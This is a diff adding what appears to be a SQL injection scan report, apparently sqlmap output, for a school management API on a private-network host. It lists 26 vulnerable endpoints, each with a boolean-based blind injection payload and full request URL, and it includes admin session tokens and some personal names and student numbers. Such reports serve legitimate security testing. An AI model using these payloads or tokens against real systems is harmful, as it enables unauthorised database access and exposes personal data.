@@ -1,0 +1,234 @@
+[序   号:] 1 
+[接口名称]: userLogout
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=user&a=userLogout&device_type=web&school=weishao' AND 3518=3518 AND 'vQKB'='vQKB&verify=admin_auto_MS_weishao__web__5a0a9b4a95d1b__2fc13eeb5cf77825036868111fd68ba4__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e 
+[对应的log文件]: 0.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=user&a=userLogout&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0a9b4a95d1b__2fc13eeb5cf77825036868111fd68ba4__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e
+
+[序   号:] 2 
+[接口名称]: getVerifyKey 
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=user&a=getVerifyKey &device_type=web&school=weishao' AND 8457=8457 AND 'DPCp'='DPCp&verify=admin_auto_MS_weishao__web__5a0a9b4a95d1b__2fc13eeb5cf77825036868111fd68ba4__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&verify_key= 
+[对应的log文件]: 1.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=user&a=getVerifyKey
+
+[序   号:] 3 
+[接口名称]: addSecondManager
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=manager&a=addSecondManager&device_type=web&school=weishao' AND 9590=9590 AND 'EUps'='EUps&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&username=59640&remark=4656565&authority_org_json=[2929]&authority_user_json=[]&authority_app_json=9385684c0279e7f3 
+[对应的log文件]: 101.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=manager&a=addSecondManager&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&username=59640&remark=4656565&authority_org_json=[2929]&authority_user_json=[]&authority_app_json=9385684c0279e7f3
+
+[序   号:] 4 
+[接口名称]: getAuthList
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=seconder&a=getAuthList&device_type=web&school=weishao' AND 2139=2139 AND 'xOni'='xOni&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&login_user_id=A549BB8F-6A84-A875-9056-E888251BBDF4 
+[对应的log文件]: 103.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=seconder&a=getAuthList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&login_user_id=A549BB8F-6A84-A875-9056-E888251BBDF4
+
+[序   号:] 5 
+[接口名称]: deleteSecondManager
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=manager&a=deleteSecondManager&device_type=web&school=weishao' AND 5743=5743 AND 'rBtn'='rBtn&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&idList='A549BB8F-6A84-A875-9056-E888251BBDF4' 
+[对应的log文件]: 104.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=manager&a=deleteSecondManager&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&idList='A549BB8F-6A84-A875-9056-E888251BBDF4'
+
+[序   号:] 6 
+[接口名称]: setAccountManagerOpt
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=manager&a=setAccountManagerOpt&device_type=web&school=weishao' AND 7743=7743 AND 'FkyN'='FkyN&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&indexId=1F147E84-7D24-8D47-77A8-DA0D9141D53A&opt=del 
+[对应的log文件]: 15.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=manager&a=setAccountManagerOpt&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&indexId=1F147E84-7D24-8D47-77A8-DA0D9141D53A&opt=del
+
+[序   号:] 7 
+[接口名称]: userList
+[注入参数]: identity (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=user&a=userList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&org_id=2929&isSearchMode=false&identity=teacher' AND 9937=9937 AND 'hvTI'='hvTI&sex=&zzmm=&sznj=&status_s=&SearchFlag=0 
+[对应的log文件]: 22.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=user&a=userList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&org_id=2929&isSearchMode=false&identity=teacher&sex=&zzmm=&sznj=&status_s=&SearchFlag=0
+
+[序   号:] 8 
+[接口名称]: adhocUserList
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=org&a=adhocUserList&device_type=web&school=weishao' AND 8675=8675 AND 'SimT'='SimT&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&org_id=1000129&page=1&count=20 
+[对应的log文件]: 32.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=org&a=adhocUserList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&org_id=1000129&page=1&count=20
+
+[序   号:] 9 
+[接口名称]: adhocUserAdd
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=org&a=adhocUserAdd&device_type=web&school=weishao' AND 8872=8872 AND 'gWXo'='gWXo&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&org_id=1000129&post_id=1092&post_name=机密岗位&username=31373&student_number=201207843&name=包罗强 
+[对应的log文件]: 35.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=org&a=adhocUserAdd&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&org_id=1000129&post_id=1092&post_name=机密岗位&username=31373&student_number=201207843&name=包罗强
+
+[序   号:] 10 
+[接口名称]: adhocOrgAdd
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=org&a=adhocOrgAdd&device_type=web&school=weishao' AND 6978=6978 AND 'wAaQ'='wAaQ&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&name=二建机构 
+[对应的log文件]: 39.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=org&a=adhocOrgAdd&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&name=二建机构
+
+[序   号:] 11 
+[接口名称]: dailyActive
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=statistics&a=dailyActive&device_type=web&school=weishao' AND 8639=8639 AND 'iXIL'='iXIL&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&time=2017-11 
+[对应的log文件]: 4.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=statistics&a=dailyActive&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&time=2017-11
+
+[序   号:] 12 
+[接口名称]: postUserList
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=org&a=postUserList&device_type=web&school=weishao' AND 8357=8357 AND 'GTRJ'='GTRJ&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&post_id=1092&page=1&count=20 
+[对应的log文件]: 44.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=org&a=postUserList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&post_id=1092&page=1&count=20
+
+[序   号:] 13 
+[接口名称]: postUserAdd
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=org&a=postUserAdd&device_type=web&school=weishao' AND 7087=7087 AND 'QeWi'='QeWi&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&post_id=1093&org_id=2929&org_name=微哨事业部&username=85220&student_number=1223010461&name=李翟&type=0 
+[对应的log文件]: 54.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=org&a=postUserAdd&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&post_id=1093&org_id=2929&org_name=微哨事业部&username=85220&student_number=1223010461&name=李翟&type=0
+
+[序   号:] 14 
+[接口名称]: postDelete
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=org&a=postDelete&device_type=web&school=weishao' AND 5673=5673 AND 'Paxa'='Paxa&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&post_id=1093 
+[对应的log文件]: 56.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=org&a=postDelete&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&post_id=1093
+
+[序   号:] 15 
+[接口名称]: labelUserList
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=label&a=labelUserList&device_type=web&school=weishao' AND 5014=5014 AND 'AMLB'='AMLB&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&label_id=91&page=1&count=20 
+[对应的log文件]: 60.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=label&a=labelUserList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&label_id=91&page=1&count=20
+
+[序   号:] 16 
+[接口名称]: userList
+[注入参数]: org_id (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=user&a=userList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&org_id=3330) AND 4010=4010 AND (1628=1628&page=1&count=13&identity=&sex=&zzmm=&sznj=&selectAll=true 
+[对应的log文件]: 65.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=user&a=userList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&org_id=3330&page=1&count=13&identity=&sex=&zzmm=&sznj=&selectAll=true
+
+[序   号:] 17 
+[接口名称]: labelUserAdd
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=label&a=labelUserAdd&device_type=web&school=weishao' AND 3589=3589 AND 'yREJ'='yREJ&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&label_id=92&userInfos=41794,102511,102677,102630,102619,102618,102530,102524,102517,102515,102514,102513,102512,102683 
+[对应的log文件]: 67.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=label&a=labelUserAdd&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&label_id=92&userInfos=41794,102511,102677,102630,102619,102618,102530,102524,102517,102515,102514,102513,102512,102683
+
+[序   号:] 18 
+[接口名称]: labelUserDelete
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=label&a=labelUserDelete&device_type=web&school=weishao' AND 6200=6200 AND 'GQsz'='GQsz&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&label_id=92&username=41794 
+[对应的log文件]: 69.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=label&a=labelUserDelete&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&label_id=92&username=41794
+
+[序   号:] 19 
+[接口名称]: getAccountManagerList
+[注入参数]: verify (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=manager&a=getAccountManagerList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e' AND 1484=1484 AND 'exJp'='exJp&user_type=1&account_type=3 
+[对应的log文件]: 7.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=manager&a=getAccountManagerList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&user_type=1&account_type=3
+
+[序   号:] 20 
+[接口名称]: labelDelete
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=label&a=labelDelete&device_type=web&school=weishao' AND 4993=4993 AND 'lhZE'='lhZE&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&label_id=92 
+[对应的log文件]: 71.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=label&a=labelDelete&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&label_id=92
+
+[序   号:] 21 
+[接口名称]: groupList
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=im&a=groupList&device_type=web&school=weishao' AND 3710=3710 AND 'pKpA'='pKpA&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&group_name=测试&page=1&count=20 
+[对应的log文件]: 75.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=im&a=groupList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&group_name=测试&page=1&count=20
+
+[序   号:] 22 
+[接口名称]: groupDelete
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=im&a=groupDelete&device_type=web&school=weishao' AND 3822=3822 AND 'ZaAD'='ZaAD&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&group_id=32765085024259 
+[对应的log文件]: 76.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=im&a=groupDelete&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&group_id=32765085024259
+
+[序   号:] 23 
+[接口名称]: groupOrgAdd
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=im&a=groupOrgAdd&device_type=web&school=weishao' AND 1003=1003 AND 'nypj'='nypj&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&type=1&org_ids=3370 
+[对应的log文件]: 81.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=im&a=groupOrgAdd&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&type=1&org_ids=3370
+
+[序   号:] 24 
+[接口名称]: getAuthList
+[注入参数]: verify (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=manager&a=getAuthList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e' AND 8341=8341 AND 'gJRw'='gJRw&offset=0&limit=20 
+[对应的log文件]: 87.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=manager&a=getAuthList&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&offset=0&limit=20
+
+[序   号:] 25 
+[接口名称]: addAuth
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=manager&a=addAuth&device_type=web&school=weishao' AND 5345=5345 AND 'jcDd'='jcDd&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&data={sendUserList:102530,orgList:6,userList:,adhocList:,lableList:,recv_user_lable:[bachelor],authority_name:热热尔尔,describe:仍然为二} 
+[对应的log文件]: 91.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=manager&a=addAuth&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&data={sendUserList:102530,orgList:6,userList:,adhocList:,lableList:,recv_user_lable:[bachelor],authority_name:热热尔尔,describe:仍然为二}
+
+[序   号:] 26 
+[接口名称]: getAuthDetail
+[注入参数]: school (POST)
+[注入类型]: boolean-based blind
+[标   题]: AND boolean-based blind - WHERE or HAVING clause
+[注入数据]: m=manager&a=getAuthDetail&device_type=web&school=weishao' AND 1659=1659 AND 'xDzr'='xDzr&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&authority_id=604 
+[对应的log文件]: 93.log
+[完整URL]: http://172.16.56.199/api/whistleMS/index.php?m=manager&a=getAuthDetail&device_type=web&school=weishao&verify=admin_auto_MS_weishao__web__5a0aa20b8adcf__37e1d070236dc759d0a0e9701275776f__nAdYj3TwL4y56s7bRbwb5WC6Uas97lfNcX6e&authority_id=604
+
